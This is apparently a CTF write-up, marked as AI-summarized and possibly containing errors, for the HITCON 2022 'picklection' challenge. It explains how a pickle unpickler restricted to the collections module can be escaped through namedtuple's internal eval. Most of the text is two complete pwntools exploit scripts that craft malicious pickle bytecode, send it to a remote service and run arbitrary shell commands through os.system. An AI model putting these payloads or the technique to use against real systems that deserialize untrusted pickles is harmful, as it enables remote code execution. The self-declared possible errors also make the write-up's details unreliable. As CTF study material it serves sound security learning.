# HITCON 2022 picklection

> Summarized by AI from the [HITCON 2022 organizers' writeup](https://hackmd.io/@94y7q597ST2hNdB9lbTJhA/SkCri-pOs) and [splitline's exploit](https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-quals/2022/misc/Picklection/exp/exploit.py). May contain errors. This challenge uses Python 3.9.13. Challenge archive [here](https://github.com/hitconctf/ctf2022.hitcon.org/releases/download/archive/picklection-0e1ebbc615be72e9c738f3d0c1aad19a95ae000a.zip).

```python
#!/usr/local/bin/python3
import pickle, collections, io

class RestrictedUnpickler(pickle.Unpickler):
     def find_class(self, module, name):
        if module == 'collections' and '__' not in name:
            return getattr(collections, name)
        raise pickle.UnpicklingError('bad')

data = bytes.fromhex(input("(hex)> "))
RestrictedUnpickler(io.BytesIO(data)).load()
```

Requirements:

1. Pickle `find_class` limited to `collections` module without `__`: use `collections.namedtuple` where a malicious field name with RCE reaches `eval` as a default argument expression

`collections.namedtuple` internally calls `eval()` to construct a lambda for `__new__` ([Python 3.9 source](https://github.com/python/cpython/blob/0bbaf5de9744ae1acea3e2c9ad2257d1cc68e847/Lib/collections/__init__.py#L345)):

```python
# Step 1: field_names is converted to a list of strings
if isinstance(field_names, str):
    field_names = field_names.replace(',', ' ').split()
field_names = list(map(str, field_names))      # (A)

# Step 2: validation - each name must be a valid identifier
for name in [typename] + field_names:          # (B)
    if type(name) is not str:
        raise TypeError(...)
    if not name.isidentifier():
        raise ValueError(...)
    if _iskeyword(name):
        raise ValueError(...)

# Step 3: further checks on field names
seen = set()
for name in field_names:                       # (C)
    if name.startswith('_') and not rename:
        raise ValueError(...)
    if name in seen:
        raise ValueError(...)
    seen.add(name)

# Step 4: final processing and eval
field_names = tuple(map(_sys.intern, field_names))  # (D)
arg_list = ', '.join(field_names)                    # (E)
code = f'lambda _cls, {arg_list}: _tuple_new(_cls, ({arg_list}))'
__new__ = eval(code, namespace)                      # (F)
```

To inject a malicious payload into `eval`, we must bypass checks at (B) and (C) while still having the payload end up in `arg_list` at (E). Both approaches below override function names in `collections` globals via the `__getattr__` mechanism to achieve this. The namespace at (F) has `__builtins__: {}`, so the payload must obtain real builtins through other means.

Summarized from the [HITCON 2022 organizers' writeup](https://hackmd.io/@94y7q597ST2hNdB9lbTJhA/SkCri-pOs) and [splitline's exploit](https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-quals/2022/misc/Picklection/exp/exploit.py).

## Approach A: UserDict.__radd__

**How it works:**

1. **Bypass validation**: Set `UserDict.__radd__ = _chain` via `BUILD` slotstate. When `namedtuple` does `[typename] + field_names`, Python tries `list.__add__(field_names)` first, gets `NotImplemented`, then calls `field_names.__radd__([typename])` which is `_chain([typename])`, yielding only `[typename]`. The payload is never visited during the identifier validation loop.

2. **Override `map`/`list`**: Update `_collections_abc.__all__` to include `"map"` and `"list"`, set `_collections_abc.map = defaultdict` and `_collections_abc.list = UserDict`. Accessing `collections.map`/`list` triggers `__getattr__`, injecting them into `collections.__dict__`.

3. **Inject payload**: Call `namedtuple("a", {payload: 0})`. Inside namedtuple:
   - `list(map(str, field_names))` → `UserDict(defaultdict(str, {payload: 0}))` — a UserDict with payload as key
   - Validation loop only sees `"a"` (due to `__radd__` trick)
   - `tuple(map(_sys.intern, field_names))` → `(payload,)` — payload becomes the sole field name
   - `arg_list = ', '.join(field_names)` → the payload string
   - `eval(f'lambda _cls, {payload}: ...')` evaluates the default argument expression, executing the command

Attack script:

```python
#!/usr/bin/env python3
from pwn import *
import struct

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
CMD = sys.argv[3] if len(sys.argv) > 3 else 'cat /home/ctf/flag'

def p32(x): return struct.pack('<I', x)
def short_binunicode(s):
    data = s.encode('utf-8'); assert len(data) < 256
    return b'\x8c' + bytes([len(data)]) + data
def stack_global(m, n): return short_binunicode(m) + short_binunicode(n) + b'\x93'

p = b''
# setattr(UserDict, "__radd__", _chain) via BUILD slotstate
p += stack_global('collections', 'UserDict') + b'(\x4e\x7d'
p += short_binunicode('__radd__') + stack_global('collections', '_chain')
p += b'\x73\x74\x62\x30'
# Modify _collections_abc.__all__ via BUILD, set map/list for __getattr__
p += stack_global('collections', '_collections_abc') + b'(\x7d'
p += short_binunicode('__all__') + b'\x5d'
p += short_binunicode('map'); p += b'\x61'
p += short_binunicode('list'); p += b'\x61'
p += b'\x73'
p += short_binunicode('map') + stack_global('collections', 'defaultdict') + b'\x73'
p += short_binunicode('list') + stack_global('collections', 'UserDict') + b'\x73'
p += b'\x7d\x74\x62\x30'
# Trigger __getattr__ to inject map/list into collections globals
p += stack_global('collections', 'map'); p += b'\x30'
p += stack_global('collections', 'list'); p += b'\x30'
# namedtuple("a", {payload: 0}) → eval triggers RCE
payload = f"a = ().__class__.__base__.__subclasses__()[84]().load_module('os').system('{CMD}'): 1 #"
p += stack_global('collections', 'namedtuple') + b'(\x8c\x01a\x7d'
p += b'X' + p32(len(payload)) + payload.encode()
p += b'J\x00\x00\x00\x00\x73\x74\x52\x2e'

r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
r.sendline((b'\x80\x04' + p).hex().encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```

## Approach B: UserString manipulation (splitline)

**How it works:**

Instead of `UserDict.__radd__`, this approach manipulates `UserString` and internal functions to redirect the namedtuple flow:

1. **Set up `__getattr__` injectees**: Add `_check_methods`, `_type_repr`, `abstractmethod`, `map`, `tuple`, `str` to `_collections_abc.__all__`. Set corresponding attributes on `_collections_abc` so `__getattr__` injects them into `collections`.

2. **Replace key functions**:
   - `UserString.replace` → `_check_methods` (class attribute via BUILD slotstate)
   - `UserString.__str__` → `_type_repr`
   - `Counter_instance.split` → `_check_methods` (instance attribute)
   - `_check_methods.__defaults__` → `(abstractmethod,)` (so zero-arg call uses `abstractmethod` as default)
   - `abstractmethod.__mro__` → `()` (so `getattr` on it returns empty tuple)
   - `_sys.intern` → `abstractmethod`
   - `_collections_abc.NotImplemented` → `Counter()` instance (so `_check_methods` returns it instead of raising)

3. **Prepare payload**: Set `Counter_instance.__qualname__ = [payload]` and `Counter_instance.__module__ = "builtins"`. The payload uses `[].__reduce_ex__(3)[0].__globals__["__builtins__"]` to get real builtins without hardcoded subclass indices.

4. **Trigger**: Calling `namedtuple(UserString("x"), UserString("x"))` with all the overrides in place causes the flow to route the payload into the lambda's default argument expression, executing the command.

Attack script:

```python
#!/usr/bin/env python3
from pwn import *
import struct

context.log_level = 'error'
HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'

class PickleBuilder:
    def __init__(self):
        self.p = b'\x80\x04'; self.memos = {}; self.next_memo = 0
    def short_binunicode(self, s):
        data = s.encode('utf-8'); assert len(data) < 256
        return b'\x8c' + bytes([len(data)]) + data
    def stack_global(self, m, n):
        return self.short_binunicode(m) + self.short_binunicode(n) + b'\x93'
    def memoize(self):
        idx = self.next_memo; self.next_memo += 1
        return b'\x94', idx
    def binget(self, idx):
        return b'h' + bytes([idx]) if idx < 256 else b'j' + struct.pack('<I', idx)
    def emit_global(self, m, n, save_as=None):
        b = self.stack_global(m, n)
        if save_as is not None:
            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
        self.p += b
    def get_memo(self, k): return self.binget(self.memos[k])
    def build_slotstate(self, obj, key, value):
        return obj + b'}\x28' + key + value + b'd\x86\x62'
    def emit_build_slotstate(self, obj, k, v): self.p += self.build_slotstate(obj, k, v)
    def emit_str(self, s, save_as=None):
        b = self.short_binunicode(s)
        if save_as is not None:
            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
        self.p += b
    def empty_tuple(self): return b')'
    def tuple1(self): return b'\x85'
    def tuple2(self): return b'\x86'
    def reduce(self): return b'R'
    def mark(self): return b'('
    def list_op(self): return b'l'
    def none(self): return b'N'
    def stop(self): return b'.'

def build_exploit():
    pb = PickleBuilder()
    for name in ['namedtuple', 'namedtuple']:
        pb.emit_global('collections', name, save_as=name)
    for name in ['_collections_abc', '_sys', 'Counter', 'UserString']:
        pb.emit_global('collections', name, save_as=name)

    pb.p += pb.mark()
    for n in ['_check_methods', '_type_repr', 'abstractmethod', 'map', 'tuple', 'str']:
        pb.p += pb.short_binunicode(n)
    pb.p += pb.list_op() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('__all__'), pb.binget(pb.next_memo - 1))

    for n in ['_check_methods', '_type_repr', 'abstractmethod']:
        pb.emit_global('collections', n, save_as=n)

    # UserString("x") with __mro__ = ()
    pb.p += pb.get_memo('UserString') + pb.short_binunicode('x') \
            + pb.tuple1() + pb.reduce() + pb.memoize()[0]
    us = pb.next_memo - 1
    pb.p += pb.binget(us) + pb.memoize()[0]
    us2 = pb.next_memo - 1
    pb.p += pb.empty_tuple() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.binget(us2), pb.short_binunicode('__mro__'),
                            pb.binget(pb.next_memo - 1))

    # Counter() instances
    pb.p += pb.get_memo('Counter') + pb.empty_tuple() + pb.reduce() + pb.memoize()[0]
    c1 = pb.next_memo - 1
    pb.p += pb.binget(c1) + pb.memoize()[0]
    c2 = pb.next_memo - 1

    for src_key, target, attr in [
        ('_check_methods', 'UserString', 'replace'),
        ('_check_methods', c2, 'split'),
    ]:
        pb.p += pb.get_memo('_check_methods') + pb.memoize()[0]
        obj = pb.get_memo(target) if isinstance(target, str) else pb.binget(target)
        pb.emit_build_slotstate(obj, pb.short_binunicode(attr), pb.binget(pb.next_memo - 1))

    pb.p += pb.get_memo('abstractmethod') + pb.tuple1() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_check_methods'),
        pb.short_binunicode('__defaults__'), pb.binget(pb.next_memo - 1))
    pb.p += pb.empty_tuple() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('abstractmethod'),
        pb.short_binunicode('__mro__'), pb.binget(pb.next_memo - 1))
    pb.p += pb.get_memo('abstractmethod') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_sys'),
        pb.short_binunicode('intern'), pb.binget(pb.next_memo - 1))

    pb.p += pb.binget(c1) + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('NotImplemented'), pb.binget(pb.next_memo - 1))

    for attr, src in [('map', '_check_methods'), ('tuple', '_type_repr')]:
        pb.p += pb.get_memo(src) + pb.memoize()[0]
        pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
            pb.short_binunicode(attr), pb.binget(pb.next_memo - 1))
    pb.p += pb.get_memo('Counter') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('type'), pb.binget(pb.next_memo - 1))

    pb.emit_str('builtins', save_as='bs')
    pb.emit_build_slotstate(pb.binget(c1), pb.short_binunicode('__module__'),
                            pb.get_memo('bs'))

    pl = f"a=[].__reduce_ex__(3)[0].__globals__[\"__builtins__\"][\"__import__\"](\"os\").system(\"{CMD}\"):0#"
    pb.p += pb.mark() + pb.short_binunicode(pl) + pb.list_op() + pb.memoize()[0]
    pb.emit_build_slotstate(pb.binget(c1), pb.short_binunicode('__qualname__'),
                            pb.binget(pb.next_memo - 1))

    pb.p += pb.get_memo('_type_repr') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('UserString'),
        pb.short_binunicode('__str__'), pb.binget(pb.next_memo - 1))
    pb.p += pb.get_memo('UserString') + pb.memoize()[0]
    pb.emit_build_slotstate(pb.get_memo('_collections_abc'),
        pb.short_binunicode('str'), pb.binget(pb.next_memo - 1))

    for n in ['map', 'tuple', 'str']:
        pb.p += pb.stack_global('collections', n)
    pb.p += pb.get_memo('namedtuple') + pb.binget(us2) + pb.binget(us2) \
            + pb.tuple2() + pb.reduce() + pb.none() + pb.stop()
    return pb.p

r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
r.sendline(build_exploit().hex().encode())
print(r.recvall(timeout=3).decode(errors='replace'))
```
